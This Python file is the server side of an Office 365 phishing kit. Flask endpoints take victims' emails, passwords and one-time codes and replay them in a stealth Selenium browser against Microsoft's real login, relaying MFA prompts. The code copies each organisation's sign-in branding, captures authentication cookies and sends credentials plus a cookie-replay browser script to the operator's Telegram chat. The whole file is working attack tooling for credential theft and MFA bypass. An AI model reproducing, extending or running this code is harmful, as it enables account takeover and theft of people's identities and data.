import os.path
import re
import string
import sys
from threading import Thread

from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium import webdriver
import time
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # hide insecure waring

# delete is exists
import os
import telebot

# temp code
if os.path.exists("cookies.txt"):
    os.remove("cookies.txt")
else:
    pass

if not os.path.exists("logo"):
    os.makedirs("logo")






##new method config json for own server

#------------------make encrypt and decrypt  chat id function

encryption_key = "окfuckSecreatexx1122"

def ksa(key):
    key_length = len(key)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]  # Swap values
    return S

def prga(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]  # Swap values
        yield S[(S[i] + S[j]) % 256]


def encode(text, key):
    key = [ord(c) for c in key]
    S = ksa(key)
    keystream = prga(S)
    encrypted = []

    for char in text:
        if isinstance(char, str):
            char_byte = char.encode("utf-8")  # Encode the character to bytes
        else:
            char_byte = bytes([char])  # Convert integer to bytes
        encrypted_char = int.from_bytes(char_byte, byteorder='big') ^ next(keystream)  # XOR operation
        encrypted.append(encrypted_char)

    return bytes(encrypted)


def getEncrptKey(text):
    encrypted_text = encode(text, encryption_key)

    # Convert encrypted bytes to a string representation
    encrypted_text_str = encrypted_text.hex().upper()

    return encrypted_text_str


def decrypt(encrypted_text, key):
    key = [ord(c) for c in key]
    S = ksa(key)
    keystream = prga(S)

    decrypted = []

    for char in encrypted_text:
        char_byte = bytes([char])
        decrypted_char = char ^ next(keystream)
        decrypted.append(decrypted_char)

    return bytes(decrypted).decode()

def getDec0dedChatId(text):
    return text;
    """
    
    :param text: 
    :return: 

    try:
        # encryption_key = "окfuckSecreatexx1122"
        encrypted_text = bytes.fromhex(text)  # bytes.fromhex("C6ABEF42864A4BB55135")

        decoded_chat_id = (decrypt(encrypted_text, encryption_key))
        return str(decoded_chat_id)
    except:
        return ""
    """

#print(decoded_chat_id)

#----------------------------- decode and encode function end

# --------------------------Read the JSON file Format and save again-----------------------------
with open('config.json', 'r') as json_file:
    data = json.load(json_file)

formatted_json = json.dumps(data, indent=2)

with open('config.json', 'w') as json_file:
    json_file.write(formatted_json)


import json
# Read the JSON file and set key:chatid:username
with open('config.json') as json_file:
    data = json.load(json_file)

# Create a list of values based on the JSON data
key_list = []
bot_token = open("bot_token.txt","r").read().strip()
for item in data:
    key = item["key"]
    username = item["username"]
    chatid = item["chatid"]


    key_list.append(f"{key}:{getDec0dedChatId(chatid)}:{username}")




"""
print('Key:', key)
print('Chatid:', chatid)
print('Username:', username)
print('Token:', bot_token)
print(key_list)
exit()
"""
##new method end

# global method
task_list = []  # container for taskid



dic = dict()  # get set dic['name'] for http code containner
dicDriver = dict()  # get set for selenium driver (need for otp bypass )

# get set email password dicEmail[taskid]
dicEmail = dict()
dicPassword = dict()




def send_sms_tg(code, user, password, chat_id):
    tb = telebot.TeleBot(bot_token)
    newLine = "\n"
    if (code == "403"):
        cpation_text = "💚 𝐎𝐟𝐟𝐢𝐜𝐞𝟑𝟔𝟓 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐥𝟎𝐆 💚" + newLine + newLine + "🎯𝐔𝐬𝐞𝐫 : " + user  + newLine + "❌𝐒𝐭𝐚𝐭𝐮𝐬 : " + "Wrong Email" + newLine + newLine + "< 𝒞𝑜𝒹𝑒𝒹 ℬ𝓎 : @Ninja111 >";
        tb.send_message(chat_id, cpation_text)
        print("=> send wrong email sms : " + str(chat_id))
    elif (code == "404"):
        cpation_text = "💚 𝐎𝐟𝐟𝐢𝐜𝐞𝟑𝟔𝟓 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐥𝟎𝐆 💚" + newLine + newLine + "🎯𝐔𝐬𝐞𝐫 : " + user + newLine + "💥𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 : " + password + newLine + "❌𝐒𝐭𝐚𝐭𝐮𝐬 : " + "Wrong Password" + newLine + newLine + "< 𝒞𝑜𝒹𝑒𝒹 ℬ𝓎 : @L0gicMan >";
        tb.send_message(chat_id, cpation_text)
        print("=> send password wrong sms : " + str(chat_id))
    elif (code == "405"):
        cpation_text = "💚 𝐎𝐟𝐟𝐢𝐜𝐞𝟑𝟔𝟓 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐥𝟎𝐆 💚" + newLine + newLine + "🎯𝐔𝐬𝐞𝐫 : " + user + newLine + "💥𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 : " + password + newLine + "❌𝐒𝐭𝐚𝐭𝐮𝐬 : " + "Too many time Wrong Password" + newLine + newLine + "< 𝒞𝑜𝒹𝑒𝒹 ℬ𝓎 : @L0gicMan >";
        tb.send_message(chat_id, cpation_text)
        print("=> send password wrong too many time sms : " + str(chat_id))
    elif (code == "500"):
        cpation_text = "💚 𝐎𝐟𝐟𝐢𝐜𝐞𝟑𝟔𝟓 𝐔𝐧𝐮𝐬𝐮𝐚𝐥 𝐥𝟎𝐆 💚" + newLine + newLine + "🎯𝐔𝐬𝐞𝐫 : " + user + newLine + "💥𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 : " + password + newLine + "❌𝐒𝐭𝐚𝐭𝐮𝐬 : " + "Account Ban" + newLine + newLine + "< 𝒞𝑜𝒹𝑒𝒹 ℬ𝓎 : @L0gicMan >";
        tb.send_message(chat_id, cpation_text)
        print("=> send password wrong sms : " + str(chat_id))


def send_doc_tg(filename, caption, chatid):
    tb = telebot.TeleBot(bot_token)
    doc = open(filename, 'rb')

    tb.send_document(int(chatid), doc, "", caption)  # message login is hint
    print("=> File Send : " + str(chatid))


##########random task id generator
def RandomPassword(length):  # max 60
    lower = string.ascii_lowercase
    num = string.digits
    upper = string.ascii_uppercase
    all = lower + num + upper

    temp = random.sample(all, length)
    password = "".join(temp)
    return password


# get random text for cookeis file name
def RandomString(length):  # max 60
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase
    all = lower + upper

    temp = random.sample(all, length)
    text = "".join(temp)
    return text


# validate user key is valid or not
def keyValidated(key):
    for k in key_list:
        if (k.split(":")[0] == key):
            return True;

    return False;




def ConverToJson(text):
    try:
        json_object = json.dumps(text)
        return json_object
    except:
        return text;


def CheckLoginResponse(taskid):
    value = Get_key_Value(taskid)
    if (value != "null"):
        if (value == "200"):
            return_text = {
                "code": "200",
                "msg": "Login Success"
            }
            return ConverToJson(return_text);
        elif (value == "404"):
            return_text = {
                "code": "404",
                "msg": "Password is wrong"
            }
            return ConverToJson(return_text);
        elif (value == "403"):
            return_text = {
                "code": "403",
                "msg": "Wrong Email Address"
            }
            return ConverToJson(return_text);
        elif (value == "501"):
            return_text = {
                "code": "501",
                "msg": "Custom bg password page"
            }
            return ConverToJson(return_text);
        elif (value == "502"):
            return_text = {
                "code": "502",
                "msg": "Regular Password page"
            }
            return ConverToJson(return_text);
        elif (value == "500"):
            return_text = {
                "code": "500",
                "msg": "Unusual activity"
            }
            return ConverToJson(return_text);
        elif (value == "503"):
            return_text = {
                "code": "503",
                "msg": "Page Loading"
            }
            return ConverToJson(return_text);
        elif (value == "601"):
            return_text = {
                "code": "601",
                "msg": "Microsoft Authenticator"
            }
            return ConverToJson(return_text);

        elif (value == "603"):
            return_text = {
                "code": "603",
                "msg": "Text Otp Page",
            }
            return ConverToJson(return_text);

        elif (value == "604"):
            return_text = {
                "code": "604",
                "msg": "Text otp wrong"
            }
            return ConverToJson(return_text);

    return value;


######## get /set by a dictionary

def Set_key_Value(key, value):
    dic[key] = value


def Get_key_Value(key):
    try:
        return dic[key]
    except:
        return "null"


# remove old task after usage
def RemoveTask(taskid):
    time.sleep(60 * 10)  # remove task after 10 minute
    if (task_list.__contains__(taskid)):
        task_list.remove(taskid)


# shat down browser after 5 mintue
def ShutDownBrowser(driver):
    time.sleep(60 * 10)  # close browser after 10 minute
    driver.close()


# selenium special helper method

# stop page for check if it load or not
def page_is_loading(driver):
    while True:
        x = driver.execute_script("return document.readyState")
        if x == "complete":
            return True
        else:
            yield False


# wait for a element visiable
def page_element_By_NAME_is_visiable(driver, name):
    while (True):
        time.sleep(0.5)
        try:
            driver.find_element(By.NAME, name)
            break
        except:
            pass


def page_element_By_ID_is_visiable(driver, id):
    while (True):
        time.sleep(0.5)
        try:
            driver.find_element(By.ID, id)
            break
        except:
            pass


####selenium helper method end

# get chatid_From key


def getChatIdFromKey(key):
    for k in key_list:
        saved_key = k.split(":")[0]
        if (saved_key == key):
            chatid = k.split(":")[1]
            # print(chatid)
            #return str(chatid);
            return str(chatid)


# use a+ ValueError : I/O operation on closed file for this
def SendCookie(driver, user, password, chatid):
    filename_cookies = "cookies_" + str(user) + "_Valid.json";  # "cookies.txt",

    cookies = driver.get_cookies()

    # Create a dictionary with a root element and the cookies list
    cookies_dict = {"cookies": cookies}

    # Convert the dictionary to a JSON string with formatting
    cookies_json = json.dumps(cookies_dict, indent=4)

    only_cookies = json.loads(cookies_json)['cookies']


    code = """//paste the code to browser console
    //PasteMyUsernamedHere
    //PasteMyPasswordHere
    
    (() => {
        let cookies = xyz

        function setCookie(key, value, domain, path, isSecure) {
            const cookieMaxAge = 'Max-Age=31536000' // set cookies to one year

            if (key.startsWith('__Host')) {
                // important not set domain or browser will rejected due to setting a domain
                console.log('cookies Set', key, value, '!IMPORTANT __Host- prefix: Cookies with names starting with __Host- must be set with the secure flag, must be from a secure page (HTTPS), must not have a domain specified (and therefore, are not sent to subdomains), and the path must be /.',);
                document.cookie = `${key}=${value};${cookieMaxAge};path=/;Secure;SameSite=None`;
            } else if (key.startsWith('__Secure')) {
                // important set secure flag or browser will rejected due to missing Secure directive
                console.log('cookies Set', key, value, '!IMPORTANT __Secure- prefix: Cookies with names starting with __Secure- (dash is part of the prefix) must be set with the secure flag from a secure page (HTTPS).',);
                document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=None`;
            } else {
                if (isSecure) {
                    console.log('cookies Set', key, value);
                    if (window.location.hostname == domain) {
                        document.cookie = `${key}=${value};${cookieMaxAge}; path=${path}; Secure; SameSite=None`;
                    } else {
                        document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=None`;
                    }
                } else {
                    console.log('cookies Set', key, value);
                    if (window.location.hostname == domain) {
                        document.cookie = `${key}=${value};${cookieMaxAge};path=${path};`;
                    } else {
                        document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};`;
                    }
                }
            }
        }
        for (let cookie of cookies) {
            setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure)
        }
        
        console.log('Coder : @L0gicMan_2023');
    })();
    """

    # Replace "xyz" with the Python variable
    code = code.replace("xyz", str(only_cookies))
    code = code.replace("PasteMyUsernamedHere",str(password)) #set email on the cookies file
    code = code.replace("PasteMyPasswordHere",str(password)) #set passowrd on the cookies file

    code = code.replace("False", "false").replace("True", "true")  # fix console paste error

    # Print the updated code
    # print(code)

    f = open(filename_cookies, "w", encoding="utf8")
    f.write(code)

    newLine = "\n"
    cpation_text = "💚 𝐎𝐟𝐟𝐢𝐜𝐞𝟑𝟔𝟓 𝐂𝐨𝐨𝐤𝐢𝐞𝐬 𝐥𝟎𝐆 💚" + newLine + newLine + "🎯𝐔𝐬𝐞𝐫 : " + user + newLine + "💥𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 : " + password + newLine + "✅𝐒𝐭𝐚𝐭𝐮𝐬 : " + "Valid Login" + newLine + newLine + "< 𝒞𝑜𝒹𝑒𝒹 ℬ𝓎 : @L0gicMan >";
    f.close()  # close file
    print("Sending file")
    send_doc_tg(filename_cookies, cpation_text, chatid)
    time.sleep(1)
    exit()


########send cookies log
def SendSuccessLog(driver, key, taskid):
    for c in driver.get_cookies():

        if ((c['name'] == "ESTSAUTH") or (c['name'] == "__Host-MSAAUTH")):  # login success cookies (for outlook)
            print("Login Success cookies found")

            # input("enter to cookie function")
            print("Saving....Cookies")
            # set status login success 200
            Set_key_Value(taskid, "200")
            email = dicEmail[taskid]
            password = dicPassword[taskid]
            SendCookie(driver, email, password, getChatIdFromKey(key))  # diver : mail : pass : chat Id


def CheckOTP(key, otp, taskid):
    try:
        driver = dicDriver[taskid]
        otp_box = driver.find_element(By.ID, "idTxtBx_SAOTCC_OTC");
        otp_box.clear()
        otp_box.send_keys(otp);

        print("Checking otp.........");

        time.sleep(0.1)
        # now click submit button
        driver.find_element(By.ID, "idSubmit_SAOTCC_Continue").click()

        time.sleep(3)

        if ">You didn't enter the expected verification code. Please try again" in driver.page_source:
            Set_key_Value(taskid, "604")  # set otp is wrong
            print("OTP IS WRONG : " + str(otp))

        elif 'error">Your session has timed out. Please close your browser and sign' in driver.page_source:
            Set_key_Value(taskid, "400")  # set for redirect (session timeout )
            print("Session timeout")
        else:
            time.sleep(3)
            SendSuccessLog(driver, key, taskid)
            print("NOt Found OTP ERROR")
    except:
        print("OTP PAGE NOT FOUND")
        pass


# driver start
def CheckMail(key, email, taskid):
    options = webdriver.ChromeOptions()
    options.add_argument("start-maximized")

    # options.add_argument("--headless")

    options = webdriver.ChromeOptions()
    options.add_argument("start-maximized")

    # options.add_argument("--headless")
    options.add_argument('--log-level=3')
    options.add_experimental_option('excludeSwitches', ['enable-logging'])

    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)

    # options.add_argument('--headless')

    #	options.headless = True

    driver = webdriver.Chrome(options=options)

    stealth(driver,
            languages=["en-US", "en"],
            vendor="Google Inc.",
            platform="Win32",
            webgl_vendor="Intel Inc.",
            renderer="Intel Iris OpenGL Engine",
            fix_hairline=True,
            )
    # create webdriver object

    # get geeksforgeeks.org
    driver.get("http://login.Microsoftonline.com")

    # time.sleep(2)

    # email = input(str("Enter email : "))

    # set status loading flask 503
    Set_key_Value(taskid, "503")

    # remove task after x minute
    thread1 = Thread(target=RemoveTask, args=(taskid,))  # run by new thread
    thread1.start()

    # close broswer after x minute
    thread1 = Thread(target=ShutDownBrowser, args=(driver,))  # run by new thread
    thread1.start()

    page_is_loading(driver)

    page_element_By_NAME_is_visiable(driver, "loginfmt")

    driver.find_element(By.NAME, "loginfmt").send_keys(email)

    time.sleep(1)

    # input("click submit")
    page_element_By_ID_is_visiable(driver, "idSIButton9")
    driver.find_element(By.ID, "idSIButton9").click()

    # if(driver.page_source.__contains__("We couldn't find an account with that username. Try another")):
    #         print("Invalid email")
    # if(driver.page_source.__contains__("This username may be incorrect. Make sure you typed it correctly")):
    #         print("Error email class found")
    # elif (driver.page_source.__contains__("Personal account")):
    #         print("email valid")

    # This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin
    # col-md-24 error ext-error

    # input("enter to see")

    page_is_loading(driver)

    time.sleep(3)

    try:
        error = driver.execute_script(
            "return document.getElementsByClassName('col-md-24 error ext-error')[0].textContent")
        print(error)
        if (str(error).__contains__("This username may be incorrect. Make sure you typed it correctly.") or str(
                error).__contains__("We couldn't find an account with that username")):
            print("Invalid email")

            # set status wrong email
            Set_key_Value(taskid, "403")
            send_sms_tg("403", email, "", getChatIdFromKey(key))  # statu_code:email:password:chat_id
            return
    except:
        print("js execute failed / email valid ")
        page_is_loading(driver)


        time.sleep(2)
        # chose prsonal account
        try:
            driver.find_element(By.ID, "msaTileTitle").click()  # (By.XPATH, "//*[text()='Personal account']").click()
        except:
            print("personal /work not found")
            pass

        page_is_loading(driver)

        # save icon work start
        page_element_By_NAME_is_visiable(driver, "passwd")
        time.sleep(4)
        page_is_loading(driver)

        # find the first element with class "logo"
        logo_elements = driver.find_elements(By.XPATH,
                                             "/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div/div/div[2]/img")
        if logo_elements:
            img_element = logo_elements[0]
            src_value = img_element.get_attribute("src")
            # print(src_value)

            if "https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_" in src_value:
                print("deafult icon")
                Set_key_Value(taskid, "502")  # regular password page
            else:
                # print("else condition")
                response = requests.get(src_value)
                # write the image content to a file
                domain_name = email.split("@")[1]

                if not os.path.exists("logo\\" + domain_name):
                    os.makedirs("logo\\" + domain_name)

                # construct the file name
                fileNameIcon = "logo/" + domain_name + "/icon.png"

                # write the response content to the file
                with open(fileNameIcon, "wb") as f:
                    f.write(response.content)

                # document.getElementById('backgroundImage').style.backgroundImage

                bg = driver.find_element(By.ID, "backgroundImage")
                bg_value = bg.value_of_css_property("background-image")
                # extract the URL string using string manipulation methods
                url_start = bg_value.find("url(")
                url_end = bg_value.find(")")
                if url_start >= 0 and url_end > url_start:
                    url_string = bg_value[url_start + 4:url_end].strip('"')
                    # print(url_string)
                    fileNameBg = "logo/" + domain_name + "/bg.png"
                    response = requests.get(url_string)
                    with open(fileNameBg, "wb") as f:
                        f.write(response.content)
                        print(domain_name + " Saved!")
            time.sleep(1.5)
            Set_key_Value(taskid, "501")  # custom bg password page

        else:
            print("No logo element found.")
            Set_key_Value(taskid, "502")  # regular password page

        # save icon work end
        time.sleep(1)
        dicDriver[taskid] = driver;



# driver end

def CheckOffice(key,taskid, email, password): #check password
    driver = dicDriver[taskid]

    try:
        # password = input(str("Enter password : "))
        page_element_By_NAME_is_visiable(driver, "passwd")
        time.sleep(1)
        driver.find_element(By.NAME, "passwd").send_keys(password)

        # input("click now")
        time.sleep(1)
        driver.find_element(By.ID, "idSIButton9").click()

        page_is_loading(driver)

        try:
            pass_error = driver.execute_script(
                "return document.getElementsByClassName('error ext-error')[0].textContent")
            print(pass_error)
            if (str(pass_error).__contains__("Your account or password is incorrect.") or str(
                    pass_error).__contains__(
                "You've tried to sign in too many times with an incorrect account or password.")):
                print("Password is wrong")
                # set status password failed 404
                Set_key_Value(taskid, "404")
                send_sms_tg("404", email, password, getChatIdFromKey(key))  # statu_code:email:password:chat_id
                return

        except:
            print("pass valid maybe")
            pass

        page_is_loading(driver)
        time.sleep(1)
        try:
            error = driver.execute_script("return document.getElementsByClassName('row text-title')[0].textContent")
            # print(error)
            if (str(error) == "You cannot access this right now"):
                print("Login Failed Unusual activity")
                # set status login unusual 500
                Set_key_Value(taskid, "500")
                send_sms_tg("500", email, password, getChatIdFromKey(key))  # statu_code:email:password:chat_id
                return
        # print("You cannot access this right now")

        except:
            pass

        try:
            print(driver.current_url)

            try:
                ideror = driver.find_element(By.ID, "idTD_Error").text
                if (ideror == "Sign-in is blocked"):
                    print("too many time tried")
                    Set_key_Value(taskid, "403")  # using 403 for redirect
                    send_sms_tg("405", email, password, getChatIdFromKey(key))  # using 405 for send too many sms
                    return
            except:
                pass

            oldurl = driver.current_url;

            # check authenticator only
            if 'true } } }">Open your Microsoft Authenticator app and approve the request to sign in' in driver.page_source:
                print("AUTHENTICATOR FOUND")
                Set_key_Value(taskid, "601")  # authenticator found
                while (True):
                    time.sleep(1)
                    if not (oldurl == driver.current_url):
                        print("URL CHANGED NOW CHECK SESSIONS")
                        time.sleep(2)
                        SendSuccessLog(driver, key, taskid)  # now check for sessoions
                        break  # now check
                        return


            # check verify your identity page
            elif "Verify your identity" in driver.page_source:
                print("=> Verify identify page found")
                if 'text: display">Approve a request on my Microsoft Authenticator app' in driver.page_source:
                    print("AUTH OPTION FOUND");
                    try:
                        js = driver.execute_script(
                            "return document.getElementsByClassName('table-cell text-left content').length")

                        for x in range(int(js)):
                            js_txt_content = driver.execute_script(
                                "return document.getElementsByClassName('table-cell text-left content')[" + str(
                                    x) + "].textContent")
                            if "Approve a request on my Microsoft Authenticator" in js_txt_content:
                                print("OK FOUND NOW CLICK AUTHENTICATE")
                                driver.execute_script(
                                    "document.getElementsByClassName('table-cell text-left content')[" + str(
                                        x) + "].click()")  # click the auth button
                                Set_key_Value(taskid, "601")  # authenticator found

                                time.sleep(1)

                                oldurl = driver.current_url;

                                time.sleep(0.1)

                                while (True):
                                    time.sleep(1)
                                    if not (oldurl == driver.current_url):
                                        print("URL CHANGED AUTH CLICK NOW CHECK SESSIONS")
                                        time.sleep(2)
                                        SendSuccessLog(driver, key, taskid)  # now check for sessoions
                                        break  # now check
                                        return


                    except Exception as e:
                        print(e)
                        pass

                elif 'text: display">Text' in driver.page_source:
                    print("TEXT OPTION FOUND")
                    try:
                        js = driver.execute_script(
                            "return document.getElementsByClassName('table-cell text-left content').length")

                        for x in range(int(js)):
                            js_txt_content = driver.execute_script(
                                "return document.getElementsByClassName('table-cell text-left content')[" + str(
                                    x) + "].textContent")
                            if "Text +" in js_txt_content:
                                print("OK FOUND NOW SEND SMS")
                                driver.execute_script(
                                    "document.getElementsByClassName('table-cell text-left content')[" + str(
                                        x) + "].click()")  # click the send sms  button
                                dicDriver[taskid] = driver;
                                Set_key_Value(taskid, "603")  # text otp page

                                return;

                    except Exception as e:
                        print(e)
                        pass

            # send success log based on valid cookies
            time.sleep(2)
            print("trying send success")
            SendSuccessLog(driver, key, taskid)

        # SEnd validate log

        except:
            pass
    except Exception as e:
        # print(e)
        pass
    driver.close()
    exit()



from flask import Flask, send_file
from flask_cors import CORS  # bypass browser block
from flask import request
import json

app = Flask(__name__)
CORS(app)  # bypass block url


@app.route("/")
def hello():
    return "Hello, World!"


@app.route("/pass", methods=['GET'])
def pass_data():
    try:
        args_arr = request.args  # get all args array
        text = args_arr.get("text");
        key = args_arr.get("key")

        # send sms to all person
        if (key == "null"):
            print("ok working")
    # for c in chat_id_list:
    # thread1 = Thread(target=send_sms_tg, args=(text,chat_id_m,))
    # thread1.start()
    # send_sms_tg(text, c);  # send sms to one by one everyone
    # print(str(text+key))
    except:
        pass
    return "404";


@app.errorhandler(404)
def ok(exception):
    return "<center>No data found!</center>";


# api method
import random


# otp method
@app.route("/otp", methods=['GET'])
def check_otp():
    try:
        args_arr = request.args  # get all args array
        otp = args_arr.get("otp");
        taskid = args_arr.get("taskid")
        key = args_arr.get("key")

        # start ask
        if (keyValidated(key) == True and otp != "" and taskid != ""):
            print("DATA OTP : " + otp + " " + taskid + " " + key)

            # random_id = RandomPassword(20)  # get random task id
            # task_list.append(random_id)

            return_text = {
                "code": "602",
                "taskid": taskid,
                "msg": "otp submit"
            }

            # CheckOffice(mail,password,random_id) # check by selenium

            thread1 = Thread(target=CheckOTP, args=(key, otp, taskid,))  # run by new thread
            thread1.start()

            return return_text;


        else:
            return_text = {
                "code": "400",
                "msg": "bot detected"
            }

            return str(return_text)
    except:
        pass
    # while(True):
    #        print("okk")

    return str("404");


@app.route("/checkpass", methods=['GET'])
def check_data():
    try:
        args_arr = request.args  # get all args array
        mail = args_arr.get("mail");
        password = args_arr.get("password")
        taskid = args_arr.get("taskid")
        key = args_arr.get("key")

        # start ask
        if (keyValidated(key) == True and mail != "" and password != "" and taskid!= ""):
            print("DATA PASS : " + mail + " " + password + " " + key)

            #random_id = RandomPassword(20)  # get random task id
            #task_list.append(random_id)

            return_text = {
                "code": "201",
                "taskid": taskid,
                "msg": "task executed"
            }

            # CheckOffice(mail,password,random_id) # check by selenium

            thread1 = Thread(target=CheckOffice, args=(key, taskid,mail, password,))  # run by new thread
            thread1.start()

            # put mail password
            dicEmail[taskid] = mail;
            dicPassword[taskid] = password;

            return return_text;


        else:
            return_text = {
                "code": "400",
                "msg": "bot detected"
            }

            return str(return_text)
    except:
        pass
    # while(True):
    #        print("okk")

    return str("404");


@app.route("/checkmail", methods=['GET'])
def check_mail_data():
    try:
        args_arr = request.args  # get all args array
        mail = args_arr.get("mail");
        key = args_arr.get("key")

        # start ask
        if (keyValidated(key) == True and mail != "" ):
            print("DATA MAIL : " + mail  + " " + key)

            random_id = RandomPassword(20)  # get random task id
            task_list.append(random_id)

            return_text = {
                "code": "201",
                "taskid": random_id,
                "msg": "task executed"
            }






            # CheckOffice(mail,password,random_id) # check by selenium

            thread1 = Thread(target=CheckMail, args=(key, mail, random_id,))  # run by new thread
            thread1.start()


            # put mail password
            dicEmail[random_id] = mail;
            #dicPassword[random_id] = password;

            return return_text;


        else:
            return_text = {
                "code": "400",
                "msg": "bot detected"
            }

            return str(return_text)
    except:
        pass
    # while(True):
    #        print("okk")

    return str("404");
# get validate or not statue

# 503 loading /waiting
# 404 password wrong
# 200 login success
# 500 unusual activity


@app.route("/result", methods=['GET'])
def result():
    try:
        args_arr = request.args  # get all args array
        taskid = args_arr.get("taskid");
        key = args_arr.get("key")

        if (keyValidated(key) == True and taskid != ""):
            print("DATA : " + taskid + " " + " " + key)
            if (task_list.__contains__(taskid)):
                print("Task found")

                return_data = CheckLoginResponse(taskid)
                if (return_data == "null"):
                    return_text = {
                        "code": "503",
                        "msg": "Checking Data"
                    }
                    return ConverToJson(return_text);
                else:
                    return str(return_data)


            else:
                return_text = {
                    "code": "400",
                    "msg": "task not found"
                }

                return ConverToJson(return_text)

        #        task_list.remove("king")

        else:
            return_text = {
                "code": "400",
                "msg": "bot detected"
            }

            return ConverToJson(return_text)



    except:
        pass
    return "404";


# image work
@app.route('/image')
def serve_image():
    args_arr = request.args  # get all args array
    mail = args_arr.get("mail");
    iconType = args_arr.get("type")  # 1 = icon , 2= backround2
    mailDomain = mail.split("@")[1]
    # print(mailDomain + "  "+mail)
    # print(iconType)
    if (iconType == "1"):
        f = "logo/" + mailDomain + "/icon.png"
        if os.path.exists(f):
            return send_file(f, mimetype='image/jpeg')
        else:
            return "File Not Found";
    elif (iconType == "2"):
        f2 = "logo/" + mailDomain + "/bg.png"
        if os.path.exists(f2):
            return send_file(f2, mimetype='image/jpeg')
        else:
            return "File Not Found";
    else:
        return "Wrong type";


################ main work #####################



banner = """

 __   ___  ___    __   ___     __   ___  __        ___  __  
/  \ |__  |__  | /  ` |__     /__` |__  |__) \  / |__  |__) 
\__/ |    |    | \__, |___    .__/ |___ |  \  \/  |___ |  \ 

                Coder By : @L0gicMan_2023

"""

print(banner)

if __name__ == '__main__':
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain('C:\\Certify\\your_domain\\fullchain.pem', 'C:\\Certify\\your_domain\\privkey.pem')

    print("\nStarting...\n")
    time.sleep(2)

    app.run(use_reloader=False, debug=True, port=443, host="0.0.0.0", ssl_context=context)
    
# main test with flask
